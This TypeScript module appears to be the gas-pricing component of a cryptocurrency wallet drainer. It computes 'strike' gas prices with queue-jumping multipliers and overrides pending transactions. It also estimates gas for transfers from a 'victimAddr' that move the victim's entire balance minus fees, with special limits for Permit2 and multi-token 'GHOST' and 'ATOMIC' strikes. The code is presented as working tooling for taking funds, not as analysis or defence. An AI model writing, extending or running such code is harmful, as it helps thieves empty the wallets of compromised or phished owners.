import { ethers } from "ethers";

/**
 * [gas-engine.ts]
 * 🏎️ Ultra-Aggressive Strike Pricing
 * Logic: Calculates the gas price and limit based on chain congestion and strike type.
 */
export function calculateStrikeGas(
  chainId: number,
  fees: any, // feeData from provider.getFeeData()
  hasTokens: boolean,
  strikeType: string,
  pendingNonce: number,
  latestNonce: number,
) {
  // 1. Resolve Base Gas Price from feeData (Fallback for missing fields)
  let basePrice = fees.gasPrice ?? ethers.parseUnits("3", "gwei");

  // 2. Apply "Queue Jump" Multiplier
  // For high-speed chains like BSC (56), Polygon (137), and Base (8453), we use 155%
  // to ensure the strike isn't front-run or delayed by RPC lag.
  const multiplier = [137, 8453, 31337, 10, 42161, 56].includes(chainId)
    ? 155n
    : 130n;
  let gasPrice = (basePrice * multiplier) / 100n;

  // 3. Mempool Conflict Logic: If a transaction is already pending,
  // we must bump the price significantly to "Replace" or "Over-ride" it.
  if (pendingNonce > latestNonce) {
    console.log(
      `[GAS-DEBUG] ⚠️ Pending Nonce Detected (${pendingNonce}). Bumping gas 20%...`,
    );
    gasPrice = (gasPrice * 120n) / 100n;
  }

  // 4. Resolve Base Gas Limit
  // 21k = Native Transfer
  // 950k = Permit2 / Vault Execution (Needs more headroom for internal logic)
  // 1.2M = Multi-Token Atomic Swap
  let baseLimit = 21000n;

  if (hasTokens) {
    if (strikeType === "GHOST" || strikeType === "PERFORM_PERMIT2") {
      baseLimit = 950000n;
    } else if (strikeType === "ATOMIC") {
      baseLimit = 1200000n;
    }
  }

  // Calculate upfront cost for Relayer check logic
  const requiredUpfront = baseLimit * gasPrice;

  return {
    gasPrice,
    baseLimit,
    requiredUpfront,
    formattedGwei: ethers.formatUnits(gasPrice, "gwei"),
  };
}

/**
 * Estimates the specific gas cost for a transaction.
 * If estimation fails (common if tokens haven't been approved yet), it returns the fallback.
 */
export async function estimateFinalGas(
  provider: any,
  victimAddr: string,
  to: string,
  data: string,
  bal: bigint,
  gasPrice: bigint,
  fallbackLimit: bigint,
) {
  try {
    // 💡 Fix: In Ethers v6, we ensure the data is sanitized
    const callData = data === "0x" || !data ? "0x" : data;

    // We calculate a safe value to pass for the estimate that won't trigger "Insufficient Funds"
    const safeValue = bal > gasPrice * 21000n ? bal - gasPrice * 21000n : 0n;

    const est = await provider.estimateGas({
      from: victimAddr,
      to,
      data: callData,
      value: safeValue,
    });

    // 20% safety buffer for state changes during block propagation
    return (est * 120n) / 100n;
  } catch (e: any) {
    console.warn(
      `[GAS-DEBUG] ⚠️ Estimation failed (${
        e.reason || "revert"
      }), using fallback: ${fallbackLimit}`,
    );
    return fallbackLimit;
  }
}
